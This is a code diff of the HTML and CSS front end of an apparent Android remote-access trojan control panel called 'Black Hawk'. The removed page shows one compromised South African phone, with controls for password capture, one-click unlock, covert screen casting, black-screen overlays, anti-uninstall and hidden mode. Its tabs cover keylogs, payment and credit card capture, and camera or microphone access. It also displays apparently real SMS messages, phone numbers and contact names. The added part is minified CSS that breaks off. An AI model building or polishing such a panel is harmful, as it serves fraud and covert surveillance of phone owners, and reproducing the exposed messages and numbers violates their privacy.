@@ -1,459 +1,84 @@
-<!DOCTYPE html>
-<html lang="zh-CN">
-<head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1.0" />
-<title>黑鹰安卓远程后台 1:1</title>
-<style>
-:root{
-  --bg:#0b1118;
-  --bg2:#0e141c;
-  --panel:#111924;
-  --panel2:#0f1721;
-  --line:#2b3643;
-  --line2:#24303b;
-  --text:#d6dfeb;
-  --muted:#7b8a9d;
-  --blue:#2f74ff;
-  --blue2:#4a8eff;
-  --red:#e23146;
-  --red2:#ff5a6f;
-  --green:#10d48a;
-  --green2:#14ec9a;
-  --cyan:#52b3ff;
-  --purple:#d379ff;
-  --orange:#ff9f2e;
-}
-*{box-sizing:border-box}
-html,body{height:100%}
-body{
-  margin:0;
-  background:var(--bg);
-  color:var(--text);
-  font-family:"Microsoft YaHei","PingFang SC",Arial,sans-serif;
-  overflow:hidden;
-}
-.app{height:100vh;padding:4px;display:flex;flex-direction:column;gap:6px}
-.topbar{
-  height:35px;
-  border:1px solid var(--line);
-  border-radius:9px;
-  background:#0d141d;
-  display:flex;
-  align-items:center;
-  gap:8px;
-  padding:0 10px;
-  white-space:nowrap;
-  overflow:hidden;
-  font-size:11px;
-}
-.device-title{display:flex;align-items:center;gap:8px;font-size:13px;font-weight:700;color:#f0f5ff;margin-right:6px}
-.phone-ico{font-size:14px}
-.tag{height:20px;display:inline-flex;align-items:center;padding:0 8px;border-radius:6px;border:1px solid #2b3a4a;background:#111b26;color:#dbe6f5;flex-shrink:0}
-.tag.green{color:#1aec93;border-color:#135d46;background:#0c2d21}
-.tag.blue{color:#82bfff;border-color:#294f76;background:#11243a}
-.tag.red{color:#ff6379;border-color:#7b2a37;background:#2a1218}
-.tag.purple{color:#de8fff;border-color:#603176;background:#25142f}
-.tag.cyan{color:#61ddff;border-color:#205b6f;background:#0e2830}
-.top-meta{color:#b3c0d0;flex-shrink:0}
-.top-meta strong{color:#f0f6ff;font-weight:600}
-.top-meta .ok{color:#1dd98f}
-.top-meta .warn{color:#ff6777}
-.top-meta .ip{color:#3be18e}
-.top-input{
-  margin-left:auto;
-  width:118px;
-  height:23px;
-  border-radius:6px;
-  border:1px solid var(--line);
-  background:#0d1520;
-  color:#8c9bac;
-  padding:0 8px;
-  font-size:11px;
-}
-.main{flex:1;display:grid;grid-template-columns:46% 54%;gap:8px;min-height:0}
-.panel{
-  border:1px solid var(--line);
-  border-radius:12px;
-  background:#101720;
-  min-height:0;
-  display:flex;
-  flex-direction:column;
-}
-.left{padding:10px}
-.screens{display:grid;grid-template-columns:1fr 1fr 1fr;gap:14px;height:530px}
-.screen{
-  background:#000;
-  border:1px solid #202c37;
-  border-radius:12px;
-  position:relative;
-  overflow:hidden;
-}
-.screen.center{background:#131820;display:flex;justify-content:center;align-items:flex-start;padding-top:16px}
-.placeholder{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;color:#637285;font-size:16px}
-.phone-shot{
-  width:240px;height:528px;background:#f4f4f4;border-radius:4px;overflow:hidden;color:#222;box-shadow:0 0 0 1px #ddd;
-}
-.phone-head{height:34px;display:flex;justify-content:space-between;align-items:center;padding:0 10px;font-size:11px;color:#444}
-.phone-body{padding:8px 14px}
-.phone-title{font-size:22px;font-weight:700;text-align:center;margin:20px 0 18px}
-.phone-actions{display:flex;justify-content:flex-end;gap:12px;color:#555;margin-bottom:10px}
-.call-list{display:flex;flex-direction:column;gap:0}
-.call-row{display:grid;grid-template-columns:18px 1fr auto;gap:8px;align-items:center;padding:9px 0;border-bottom:1px solid #ebebeb;font-size:12px}
-.call-row .name{font-size:13px;color:#333}
-.call-row .time{color:#7f7f7f;font-size:11px}
-.phone-nav{position:absolute;bottom:0;left:0;right:0;height:50px;border-top:1px solid #e5e5e5;background:#fafafa;display:grid;grid-template-columns:repeat(3,1fr);font-size:11px;color:#737373}
-.phone-nav div{display:flex;flex-direction:column;align-items:center;justify-content:center;gap:4px}
-.quickbar{display:flex;align-items:center;justify-content:space-between;gap:12px;padding:10px 6px 8px}
-.quick-left,.quick-mid,.quick-right{display:flex;align-items:center;gap:8px}
-.mini-btn,.icon-btn,.send-btn{
-  height:32px;border-radius:8px;border:1px solid #2f3e4f;background:#162231;color:#e8f0ff;font-size:11px;padding:0 12px;display:inline-flex;align-items:center;justify-content:center;gap:6px
-}
-.icon-btn{width:34px;padding:0;background:#131d29;font-size:15px;color:#b9c6d7}
-.quick-input{width:290px;height:32px;border-radius:8px;border:1px solid #2f3e4f;background:#0d1520;color:#d7e0ed;padding:0 10px;font-size:11px}
-.quick-input::placeholder{color:#79889a}
-.send-btn{background:#a92a38;border-color:#c04b58;color:#fff;padding:0 16px}
-.command-wrap{flex:1;display:flex;flex-direction:column;min-height:0}
-.commands{
-  flex:1;
-  border:1px solid #2a3643;
-  border-radius:10px;
-  background:#0c1118;
-  padding:8px;
-  display:grid;
-  grid-template-columns:repeat(4,1fr) 16px repeat(4,1fr);
-  grid-auto-rows:44px;
-  gap:8px;
-}
-.separator{grid-column:5;grid-row:1 / span 6;display:flex;justify-content:center}
-.separator::after{content:"";width:1px;background:#2e3b48;border-radius:1px}
-.cmd{
-  border-radius:8px;
-  border:1px solid #2f3e50;
-  background:#111924;
-  color:#6f7f93;
-  display:flex;
-  align-items:center;
-  justify-content:center;
-  text-align:center;
-  font-size:12px;
-  font-weight:600;
-  line-height:1.15;
-  padding:0 6px;
-}
-.cmd.blue{background:#2f74ff;border-color:#5b95ff;color:#fff}
-.cmd.red{background:#d82630;border-color:#ff4f5f;color:#fff}
-.cmd.greenline{
-  grid-column:1 / span 4;
-  background:#0d2a1e;
-  border-color:#167d57;
-  color:#1ee78f;
-  justify-content:flex-start;
-  padding-left:14px;
-  font-size:13px;
-}
-.right{padding:8px 10px 10px;min-width:0}
-.tabs{display:flex;gap:7px;align-items:center;flex-wrap:nowrap;overflow:hidden;padding-bottom:10px}
-.tab{height:31px;border-radius:8px;border:1px solid #2f3d4c;background:#121b26;color:#9db0c6;padding:0 12px;display:inline-flex;align-items:center;justify-content:center;font-size:12px;white-space:nowrap}
-.tab.active{background:#2a1218;border-color:#883846;color:#ff6276}
-.content-box{flex:1;border:1px solid var(--line);border-radius:12px;background:#131a23;display:flex;flex-direction:column;min-height:0;overflow:hidden}
-.sms-head{display:flex;align-items:center;justify-content:space-between;padding:16px 16px 10px 16px}
-.sms-title{display:flex;align-items:center;gap:10px;font-size:14px;font-weight:700;color:#eef6ff}
-.sms-title .count{font-size:11px;color:#8f9fb3;background:#1f2935;border:1px solid #334355;border-radius:20px;padding:2px 8px}
-.sms-actions{display:flex;align-items:center;gap:8px}
-.search{width:200px;height:30px;border-radius:8px;border:1px solid #2f3d4c;background:#0e1621;color:#d7e3f0;padding:0 10px;font-size:12px}
-.action-btn{height:30px;border-radius:8px;border:1px solid #304050;background:#141d29;color:#d4deea;padding:0 12px;font-size:12px;display:inline-flex;align-items:center;gap:6px}
-.action-btn.green{background:#103320;border-color:#1a6c49;color:#24f09a}
-.action-btn.red{background:#32151a;border-color:#7f3943;color:#ff7687}
-.table-wrap{flex:1;overflow:auto;padding:0 16px}
-.table-wrap::-webkit-scrollbar{width:8px;height:8px}.table-wrap::-webkit-scrollbar-thumb{background:#2c3948;border-radius:8px}
-table{width:100%;border-collapse:collapse;table-layout:fixed}
-thead th{position:sticky;top:0;background:#131a23;color:#95a9bf;font-size:12px;text-align:left;padding:12px 8px;border-bottom:1px solid #273341;z-index:1}
-tbody td{padding:11px 8px;border-bottom:1px solid #222e3b;font-size:12px;color:#dde7f4;vertical-align:top}
-.col-num{width:118px;color:#f2f7ff;font-weight:600}
-.col-time{width:160px;color:#bac8d9;text-align:right}
-.sms-text{color:#d7e2ef;line-height:1.4}
-.footer{display:flex;align-items:center;justify-content:flex-end;gap:16px;padding:12px 16px;border-top:1px solid #273341;color:#9dafc4;font-size:12px}
-.footer select,.page-btn{height:30px;border-radius:8px;border:1px solid #2f3d4c;background:#131c28;color:#dbe6f2;padding:0 10px}
-.page-btn.active{background:#101722;border-color:#4e6075;color:#fff}
-.page-group{display:flex;align-items:center;gap:8px}
-.smallmuted{color:#77879a}
-</style>
-</head>
-<body>
-<div class="app">
-  <div class="topbar">
-    <div class="device-title"><span class="phone-ico">📱</span><span>SM-A057F</span></div>
-    <span class="tag green">在线</span>
-    <span class="tag blue">移动数据</span>
-    <span class="tag green">无障碍</span>
-    <span class="tag">锁屏</span>
-    <span class="tag green">SIM</span>
-    <span class="tag purple">管理员</span>
-    <span class="top-meta"><strong class="ok">76%</strong></span>
-    <span class="top-meta">南非时间 <strong id="saTime">10:48:43</strong> | 北京时间 <strong id="bjTime">16:48:43</strong></span>
-    <span class="top-meta">设备ID: <strong style="color:#63b7ff">ADB798AC9B777FCB</strong></span>
-    <span class="top-meta">系统 <strong style="color:#a68cff">Android 15</strong></span>
-    <span class="top-meta">IP: <strong class="ip">105.245.102.250 南非</strong></span>
-    <span class="top-meta">应用容许: <strong class="ip">6bd37d03fa7d8752ea36ba344bb79c5f34fd32577ef4696c36c49f96384d0da</strong></span>
-    <span class="top-meta">服务器延时: <strong class="warn">超时</strong></span>
-    <span class="top-meta">设备密钥: <strong class="warn">超时</strong></span>
-    <input class="top-input" placeholder="输入备注..." />
-  </div>
+<!doctype html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>黑鹰安卓远程 · 设备管理</title><style>
+:root{--bg:#0c1117;--panel:#161b22;--border:#303943;--soft:#202731;--muted:#788797;--text:#b9c5d7;--green:#00d17a;--blue:#3f9bff;--red:#ff475e;--purple:#c468f7}*{box-sizing:border-box}body{margin:0;background:var(--bg);color:var(--text);font-family:"Microsoft YaHei","Noto Sans CJK SC",Arial,sans-serif;font-size:11px;overflow:hidden}button,input,select{font:inherit}button{cursor:pointer}.side{position:fixed;top:5px;bottom:5px;left:6px;width:126px;background:#0a0e14;border:1px solid #202b39;border-radius:7px;padding:7px;display:flex;flex-direction:column;z-index:3}.brand{background:#101922;border:1px solid #2e3745;height:32px;border-radius:7px;color:#ff563c;font-size:12px;font-weight:700;display:flex;align-items:center;justify-content:center;gap:7px}.eagle{font-size:17px;color:#f44}.side button{display:flex;align-items:center;width:100%;height:26px;margin-top:4px;padding:0 9px;color:#8d9aab;border-radius:7px;background:#18202a;border:1px solid #2e3946;text-align:left;gap:8px;font-size:11px}.side button:hover{border-color:#506178;color:#fff}.side button.active{background:#2a0c13;color:#ff586c;border-color:#831c2c}.side button .ico{width:12px;text-align:center;font-size:13px;flex-shrink:0}.group-title{font-weight:700;color:#e2e8ef;font-size:11px;margin:15px 3px 5px}.bottom{margin-top:auto;padding:10px 4px 0;border-top:1px solid #243040;color:#7c8a9a}.bottom .dot{color:#00c767;font-size:13px}.viewport{margin-left:140px;height:100vh;padding:0 7px;min-width:950px}.heading{height:29px;display:flex;align-items:center;justify-content:space-between;gap:8px;white-space:nowrap}.path{font-size:11px;font-weight:650;color:#e3ebf5}.righthead{display:flex;align-items:center;gap:7px;color:#8f9aac}.righthead .field{min-width:99px;height:25px;padding:3px 9px;text-align:center;background:#101721;border-radius:6px;border:1px solid #2b3441}.righthead .field.slim{min-width:55px}.righthead b{color:#00d477;font-weight:normal}.topicon{color:#e4edf4;font-size:15px;padding:0 5px}.stats{display:flex;gap:7px;height:32px;align-items:center}.metric{height:29px;padding:0 12px;display:flex;align-items:center;gap:8px;border:1px solid #2d3847;border-radius:7px;color:#96a9bf;background:#0f1823;white-space:nowrap}.metric .n{font-size:12px;color:inherit}.metric.red{color:#ff586b;border-color:#86213a;background:#271119}.metric.green{color:#00d678;border-color:#074d36;background:#0d241e}.metric.blue{color:#458dff;border-color:#17385f;background:#0d1a31}.metric.orange{color:#f79327;border-color:#583116;background:#24190f}.metric.cyan{color:#00c2d9;border-color:#064257;background:#0b202c}.toolbar{height:48px;display:flex;align-items:center;gap:5px;white-space:nowrap;overflow:hidden}.tool{height:28px;min-width:0;flex:0 0 auto;padding:0 9px;background:#141b25;color:#8797a8;border:1px solid #2e3844;border-radius:7px;white-space:nowrap;display:inline-flex;align-items:center;justify-content:center;gap:5px}.tool.on{border-color:#573078;color:#b974ff;background:#22132f}.tool:disabled{opacity:.5;cursor:default}.tool.small{padding:0 6px}.tool.selected{color:#fb5267;border-color:#773045}.toolbar input{background:#0d1520;border:1px solid #313a46;border-radius:7px;color:#e1e8ed;outline:0;flex:0 1 268px;min-width:160px;width:268px;height:28px;padding:0 10px}.toolbar input::placeholder{color:#738092}.frame{height:calc(100vh - 110px);overflow:auto;padding-right:3px}.frame::-webkit-scrollbar{width:6px}.frame::-webkit-scrollbar-thumb{background:#283340;border-radius:9px}.cards{display:grid;grid-template-columns:repeat(5,minmax(0,1fr));gap:9px}.card{height:318px;border:1px solid #303a47;border-radius:11px;padding:10px;background:#171c24;overflow:hidden;position:relative}.card.online-first{border-color:#1c5340}.line-top{display:flex;gap:7px;align-items:flex-start;height:38px}.deviceicon{width:32px;height:33px;border-radius:7px;border:1px solid #475563;background:#29313b;display:flex;align-items:center;justify-content:center;flex-shrink:0;color:#ddd;font-size:23px}.devicehead{flex:1;min-width:0}.devicehead .title{display:flex;align-items:center;gap:5px;color:#c3e8ff;font-size:12px;font-weight:700}.devicehead .title em{display:inline-block;width:6px;height:6px;border-radius:99px;background:#00db73;flex-shrink:0}.devicehead .title .device-name{overflow:hidden;text-overflow:ellipsis;white-space:nowrap}.devicehead .id{color:#8091a9;font-size:10px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;margin-top:3px}.icons{display:flex;align-items:center;gap:9px;color:#929eaf;font-size:15px}.tags{height:23px;white-space:nowrap;display:flex;gap:3px;align-items:center}.tag{height:17px;border-radius:4px;padding:2px 4px;line-height:13px;font-size:10px;border:1px solid #1a385e;background:#142c48;color:#53abff}.tag.sim{background:#0c3329;border-color:#185139;color:#00e288}.tag.access{background:#0c3024;border-color:#16533d;color:#00df91}.tag.admin{background:#332142;border-color:#50276b;color:#d187ff}.tag.screen{background:#2c323b;border-color:#3e454e;color:#d3dce8}.battery{font-size:10px;color:#7b8694;padding:0 2px;white-space:nowrap}.battery.low{color:#ef8a24}.battery.full{color:#32d97d}.details{margin:1px 0 0}.detail{height:22px;border-bottom:1px solid #26313c;display:flex;align-items:center;gap:3px;white-space:nowrap;overflow:hidden;font-size:11px}.detail .k{color:#7e8fa6;flex-shrink:0}.detail .v{color:#b9cce5;overflow:hidden;text-overflow:ellipsis}.detail .v.ip{color:#50aeff}.detail .v.owner{color:#f99925}.detail .v.faint{color:#778493}.detail .v.good{color:#10d878}.detail .v.warn{color:#f6bd38}.detail .v.remark{font-weight:700}.pagination{position:absolute;bottom:0;left:139px;right:0;height:39px;background:#0c1117;border-top:1px solid #29313b;display:flex;align-items:center;justify-content:flex-end;gap:12px;padding:0 17px;color:#9dacbd;font-size:10px}.pagination select{background:#151d26;border:1px solid #303c4b;border-radius:7px;color:#cdd5df;padding:6px}.pagination button{background:#141b25;border:1px solid #303c4b;border-radius:5px;color:#d4dfee;padding:6px 10px}.preview-mark{font-size:10px;color:#607286;margin-right:auto}
+#detail{display:none}.control-page .topline{height:37px;display:flex;gap:6px;align-items:center;white-space:nowrap}.control-page .topline b{font-size:17px;color:#dceeff}.control-page .topline .tag{font-size:10px}.control-page .threepane{display:grid;grid-template-columns:46% 54%;gap:8px;height:calc(100vh - 45px)}.control-page .leftpane,.control-page .rightpane{border:1px solid #303946;border-radius:10px;padding:10px;background:#151a21}.control-page .screens{display:grid;grid-template-columns:repeat(3,1fr);gap:9px;height:63%}.control-page .screen{display:flex;align-items:center;justify-content:center;background:black;border-radius:12px;color:#4a5867;font-size:11px}.control-page .quick{display:flex;align-items:center;justify-content:space-between;height:40px}.control-page .quick .tool{margin-right:5px}.control-page .commands{height:calc(37% - 40px);background:#0b0e14;border:1px solid #313b48;border-radius:9px;padding:8px;display:grid;grid-template-columns:repeat(8,minmax(0,1fr));grid-auto-rows:24px;gap:5px}.control-page .commands button{background:#2560df;color:#fff;border:1px solid #4686f3;border-radius:5px;font-size:10px;min-width:0;overflow:hidden;white-space:nowrap}.control-page .commands button:disabled{background:#111820;color:#677586;border-color:#303b49}.control-page .tabs{display:flex;gap:5px;overflow:hidden;white-space:nowrap;height:37px}.control-page .tabs .tool{font-size:10px}.control-page .analysis{height:calc(100% - 37px);border:1px solid #303b48;border-radius:9px;background:#171c24;position:relative;display:flex;align-items:center;justify-content:center;flex-direction:column;color:#90a9c9}.control-page .analysis .sectionlabel{position:absolute;top:25px;left:20px;color:#b1d4fc}.control-page .analysis .rightactions{position:absolute;top:21px;right:15px}.phonecircle{font-size:42px;margin-bottom:10px}.clickable{cursor:pointer}.clickable:hover{filter:brightness(1.15)}@media(max-width:1250px){.cards{grid-template-columns:repeat(4,minmax(0,1fr))}}@media(max-width:1050px){.cards{grid-template-columns:repeat(3,minmax(0,1fr))}}
 
-  <div class="main">
-    <div class="panel left">
-      <div class="screens">
-        <div class="screen"><div class="placeholder">屏幕阅读未开启</div></div>
-        <div class="screen center">
-          <div class="phone-shot">
-            <div class="phone-head"><span>09:24</span><span>◔ ᯤ 76%</span></div>
-            <div class="phone-body">
-              <div class="phone-title">Phone</div>
-              <div class="phone-actions"><span>☰</span><span>⌕</span><span>⋮</span></div>
-              <div style="font-size:11px;color:#888;margin-bottom:6px;">Today</div>
-              <div class="call-list">
-                <div class="call-row"><span>📞</span><span class="name">Mandla Hlatjwayo (2)</span><span class="time">09:19</span></div>
-                <div class="call-row"><span>📞</span><span class="name">Ps Msibi</span><span class="time">08:55</span></div>
-                <div class="call-row"><span>📞</span><span class="name">Siyabonga</span><span class="time">08:25</span></div>
-                <div class="call-row"><span>📞</span><span class="name">Babe Ben (3)</span><span class="time">08:17</span></div>
-                <div class="call-row"><span>📞</span><span class="name">Mpumi Love</span><span class="time">08:02</span></div>
-                <div class="call-row"><span>📞</span><span class="name">Ps Nkentshane</span><span class="time">08:00</span></div>
-                <div class="call-row"><span>📞</span><span class="name">Ps Edwin Makiwa</span><span class="time">07:42</span></div>
-              </div>
-            </div>
-            <div class="phone-nav">
-              <div><span>⌨</span><span>Keypad</span></div>
-              <div><span>🕘</span><span>Recents</span></div>
-              <div><span>👤</span><span>Contacts</span></div>
-            </div>
-          </div>
-        </div>
-        <div class="screen"><div class="placeholder">点击ADB投屏按钮开始</div></div>
-      </div>
+#module{display:none;padding:18px;border:1px solid #303943;border-radius:10px;background:#151a21;margin-top:10px;min-height:240px}#module h2{color:#e2e8f0;margin:0 0 16px;font-size:16px}#module p{color:#9aaabd;font-size:12px}.statusbar{color:#9ba6b6;font-size:11px}#toast{position:fixed;bottom:56px;left:50%;transform:translateX(-50%);display:none;padding:11px 18px;border-radius:8px;border:1px solid #405164;background:#202b39;color:#fff;z-index:30;box-shadow:0 9px 26px #0008}.card:focus{outline:1px solid #498fd8}.tool.activefilter{color:#85bdff;border-color:#3567a0}.detail .v{max-width:75%}#detail .analysis .rightactions button:disabled{opacity:.45}#detail .commands button:disabled{opacity:.62}#detail .tabs button.current{color:#da9bff;border-color:#5a3586;background:#291c39}.side button{flex-shrink:0}.side{overflow:auto}.cards .card .line-top .deviceicon{font-size:19px}#loading{padding:30px 8px;color:#a9b5c9}.module-toolbar{display:flex;gap:8px;align-items:center;margin:14px 0}.module-toolbar input{background:#0e1824;border:1px solid #354455;border-radius:6px;padding:8px;color:#fff}.badge-notlive{font-size:10px;color:#ffb856;border:1px solid #604a28;padding:3px 7px;border-radius:5px;margin-left:8px} @media(max-width:1100px){.toolbar{overflow-x:auto}.righthead{overflow:hidden}}
 
-      <div class="quickbar">
-        <div class="quick-left">
-          <button class="mini-btn">🌐 同步翻译</button>
-          <button class="mini-btn">⌨ 虚拟键盘</button>
-        </div>
-        <div class="quick-mid">
-          <button class="icon-btn">🔔</button>
-          <button class="icon-btn">➤</button>
-          <button class="icon-btn">⌂</button>
-          <button class="icon-btn">▢</button>
-          <button class="icon-btn">⚙</button>
-        </div>
-        <div class="quick-right">
-          <input class="quick-input" placeholder="输入文本..." />
-          <button class="send-btn">发送</button>
-        </div>
-      </div>
-
-      <div class="command-wrap">
-        <div class="commands">
-          <div class="cmd blue">隐藏屏幕</div>
-          <div class="cmd blue">锁定屏幕</div>
-          <div class="cmd blue">开启阅读器</div>
-          <div class="cmd blue">阅读器设置</div>
-          <div class="separator"></div>
-          <div class="cmd blue">开启ADB模式</div>
-          <div class="cmd">开启无障碍</div>
-          <div class="cmd">关闭无障碍</div>
-          <div class="cmd">无障碍状态</div>
-
-          <div class="cmd blue">密码获取</div>
-          <div class="cmd blue">一键解锁</div>
-          <div class="cmd blue">亮度调暗</div>
-          <div class="cmd blue">开启静音</div>
-          <div class="cmd">黑屏遮挡</div>
-          <div class="cmd">取消黑屏</div>
-          <div class="cmd">开启勿扰</div>
-          <div class="cmd">关闭勿扰</div>
-
-          <div class="cmd red">无感投屏 ✓</div>
-          <div class="cmd">系统投屏</div>
-          <div class="cmd">ADB投屏</div>
-          <div class="cmd red">关闭投屏</div>
-          <div class="cmd">激活管理员</div>
-          <div class="cmd">移除管理员</div>
-          <div class="cmd">管理员状态</div>
-          <div class="cmd">至装APP</div>
-
-          <div class="cmd blue">黑屏遮挡</div>
-          <div class="cmd blue">系统更新</div>
-          <div class="cmd">阻断运作</div>
-          <div class="cmd">取消遮挡</div>
-          <div class="cmd">安装APP</div>
-          <div class="cmd">卸载APP</div>
-          <div class="cmd">启动APP</div>
-          <div class="cmd">同步设备ID</div>
-
-          <div class="cmd blue">投屏设置（标准）</div>
-          <div class="cmd red">关闭日志</div>
-          <div class="cmd red">关闭防卸载</div>
-          <div class="cmd blue">隐藏模式</div>
-          <div class="cmd">检查状态</div>
-          <div class="cmd">同步配置</div>
-          <div class="cmd">重启连接</div>
-          <div class="cmd">重启FRPC</div>
-
-          <div class="cmd blue">植入ADB</div>
-          <div class="cmd blue">重启ADB</div>
-          <div class="cmd blue">无线配对</div>
-          <div class="cmd blue">至装投屏</div>
-          <div class="cmd">安全设置</div>
-          <div class="cmd">写入权限</div>
-          <div class="cmd blue">敏感App</div>
-          <div class="cmd blue">安全App</div>
-
-          <div class="cmd greenline">● 当前投屏: 无感投屏</div>
-        </div>
-      </div>
-    </div>
-
-    <div class="panel right">
-      <div class="tabs">
-        <div class="tab">AI分析</div>
-        <div class="tab">密码记录</div>
-        <div class="tab">支付捕获</div>
-        <div class="tab active">短信</div>
-        <div class="tab">键盘日志</div>
-        <div class="tab">信用卡数据</div>
-        <div class="tab">摄像/麦克风</div>
-        <div class="tab">相册</div>
-        <div class="tab">文件</div>
-        <div class="tab">应用/注入</div>
-        <div class="tab">通讯录</div>
-        <div class="tab">权限</div>
-        <div class="tab">群发功能</div>
-      </div>
-
-      <div class="content-box">
-        <div class="sms-head">
-          <div class="sms-title">📱 短信 <span class="count">106 条</span></div>
-          <div class="sms-actions">
-            <input class="search" placeholder="搜索发送方/内容..." />
-            <button class="action-btn green">📲 获取短信</button>
-            <button class="action-btn">☆ 翻译本页</button>
-            <button class="action-btn">⇩ 导出</button>
-            <button class="action-btn">⟳</button>
-            <button class="action-btn red">🗑 清空</button>
-          </div>
-        </div>
-
-        <div class="table-wrap">
-          <table>
-            <thead>
-              <tr>
-                <th class="col-num">号码</th>
-                <th>内容</th>
-                <th class="col-time">时间</th>
-              </tr>
-            </thead>
-            <tbody>
-              <tr>
-                <td class="col-num">+27720273621</td>
-                <td class="sms-text">Good evening brothers that training in Mangweni is on as usual time to start 8 am until 16:00 pm food and refreshments is available. So Selby be ready in the mrng and Nicholas Msibi also and Bandile I will be at Tonga by 07:30 thanx brothers</td>
-                <td class="col-time">2026/10/14 04:21:27</td>
-              </tr>
-              <tr>
-                <td class="col-num">+2782005076214109</td>
-                <td class="sms-text">Hi Mduduzi, use your R4,163 to shop the Truworths REAL SALE on selected Ladies, Mens &amp; Kids fashion! Starts Wed 14 Oct @12pm, in-store + online. Stop=Optout</td>
-                <td class="col-time">2026/10/13 22:54:30</td>
-              </tr>
-              <tr>
-                <td class="col-num">Vodacom</td>
-                <td class="sms-text">You've used 11.8 VodaBucks. To view your VodaBucks balance, visit VodaPay: https://vodapay.go.link/bruaw or dial *133#. T&amp;Cs.</td>
-                <td class="col-time">2026/10/13 18:15:28</td>
-              </tr>
-              <tr>
-                <td class="col-num">+2782005076160288</td>
-                <td class="sms-text">Good news! Old Mutual iWYZE wants to help you lower your car insurance premium. Reply YES for a FREE quote. NO=Opt-out. FSP &amp; Ins. Ts&amp;Cs. AL</td>
-                <td class="col-time">2026/10/13 16:36:04</td>
-              </tr>
-              <tr>
-                <td class="col-num">VODACOM15</td>
-                <td class="sms-text">Your bundle has been activated and is valid until 2026-10-13 at 23:59:59.</td>
-                <td class="col-time">2026/10/13 15:32:34</td>
-              </tr>
-              <tr>
-                <td class="col-num">Voda Alerts</td>
-                <td class="sms-text">Your 100 Voda min Vodacom bundle is now active and will be valid until 23:59:59 today.</td>
-                <td class="col-time">2026/10/13 06:23:10</td>
-              </tr>
-              <tr>
-                <td class="col-num">+27791829289</td>
-                <td class="sms-text">Call me from LOVE - (AD) GameZAR fun starts! Dial *148*49# &amp; you could WIN R5 instantly. R3/day. Ts&amp;Cs Apply.</td>
-                <td class="col-time">2026/10/12 20:34:39</td>
-              </tr>
-              <tr>
-                <td class="col-num">Voda Alerts</td>
-                <td class="sms-text">Your 100 Voda min Vodacom bundle is now active and will be valid until 23:59:59 today.</td>
-                <td class="col-time">2026/10/12 14:14:11</td>
-              </tr>
-              <tr>
-                <td class="col-num">Vodacom</td>
-                <td class="sms-text">Vodacom: A reminder that your YouTube bundle expires on 2026-10-15 23:59. Want to buy a new bundle? Dial *135# or visit https://vodapay.go.link/eJ0wb</td>
-                <td class="col-time">2026/10/12 12:17:26</td>
-              </tr>
-              <tr>
-                <td class="col-num">Vodacom</td>
-                <td class="sms-text">Vodacom: Well Done! You've earned 3.9 VodaBucks. T&amp;Cs apply.</td>
-                <td class="col-time">2026/10/11 13:54:42</td>
-              </tr>
-              <tr>
-                <td class="col-num">+27769861898</td>
-                <td class="sms-text">Call me from +27769861898 - (AD) Set AMA BUFFALO NAMA ELEPHANT as your Ringback Tone &amp; you could WIN! R3/day. Ts&amp;Cs Apply.</td>
-                <td class="col-time">2026/10/10 23:54:40</td>
-              </tr>
-              <tr>
-                <td class="col-num">+27769745916</td>
-                <td class="sms-text">Call me from Iencan - (AD) Make your Fantasy Dribble picks! Dial *148*105# to join &amp; WIN R5 instantly. R5/day. Ts&amp;Cs Apply.</td>
-                <td class="col-time">2026/10/10 19:56:26</td>
-              </tr>
-              <tr>
-                <td class="col-num">Vodacom</td>
-                <td class="sms-text">Heads up! You have less than 48 minutes left of your VC-VC Anytime balance on 0794440751. To top up, dial *123# and select 'Voice' or visit the Vodapay App https://vodapay.go.link/e5j6.</td>
-                <td class="col-time">2026/10/10 01:28:13</td>
-              </tr>
-            </tbody>
-          </table>
-        </div>
-
-        <div class="footer">
-          <span>每页行数</span>
-          <select>
-            <option selected>50</option>
-            <option>100</option>
-          </select>
-          <span>1-50 / 共 106</span>
-          <div class="page-group">
-            <button class="page-btn active">1</button>
-            <button class="page-btn">2</button>
-            <button class="page-btn">3</button>
-          </div>
-        </div>
-      </div>
-    </div>
-  </div>
-</div>
-
-<script>
-(function(){
-  function pad(n){return String(n).padStart(2,'0');}
-  function updateClocks(){
-    const now = new Date();
-    const bj = new Date(now.toLocaleString('en-US',{timeZone:'Asia/Shanghai'}));
-    const sa = new Date(now.toLocaleString('en-US',{timeZone:'Africa/Johannesburg'}));
-    const bjText = pad(bj.getHours())+':'+pad(bj.getMinutes())+':'+pad(bj.getSeconds());
-    const saText = pad(sa.getHours())+':'+pad(sa.getMinutes())+':'+pad(sa.getSeconds());
-    document.getElementById('bjTime').textContent = bjText;
-    document.getElementById('saTime').textContent = saText;
-  }
-  updateClocks();
-  setInterval(updateClocks,1000);
-})();
-</script>
-</body>
-</html>
+/* V5 extensions intentionally preserve the approved dark five-column layout */
+.modebar{margin-left:auto;display:flex;align-items:center;gap:6px;white-space:nowrap;min-width:0}.modechoice{padding:5px 10px;border:1px solid #3a4350;background:#141d27;border-radius:5px;color:#91a0b3;font-size:11px}.modechoice.active{color:#ee6674;border-color:#813146;background:#2d151f}.modechoice.active.real{color:#13d18c;border-color:#1d7356;background:#0d2720}#mode-tag{color:#e7a65b;font-size:10px;margin-left:5px}#mode-tag.real{color:#04be7d}.toolbar select.tool{height:28px;color:#95a5b7;appearance:auto;max-width:125px}#add-pair{color:#13c99a;border-color:#266a55}.page-arrow{border:1px solid #34404e;background:#16202a;color:#bbc6d9;border-radius:4px;padding:2px 9px;cursor:pointer}.page-arrow:disabled{opacity:.3;cursor:default}#module{padding:18px 22px;overflow:auto;max-height:calc(100vh - 30px)}#module h2{color:#d9e4f5;font-size:20px}#module>p{color:#8f9daf}#module-content{max-width:1150px;padding:8px 0 20px}.module-box{border:1px solid #35404e;background:#171e28;border-radius:9px;padding:17px;margin:10px 0;color:#bdcadd}.module-box strong{color:#e5edf7}.module-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(210px,1fr));gap:10px}.module-box .big{display:block;font-size:25px;color:#49a3fc;margin-top:10px}.table-wrap{overflow-x:auto}.module-table{width:100%;border-collapse:collapse;min-width:520px}.module-table th,.module-table td{text-align:left;padding:10px 12px;border-bottom:1px solid #323c49}.module-table th{color:#83a8d1;background:#1d2733}.module-action{padding:7px 13px;background:#142943;border:1px solid 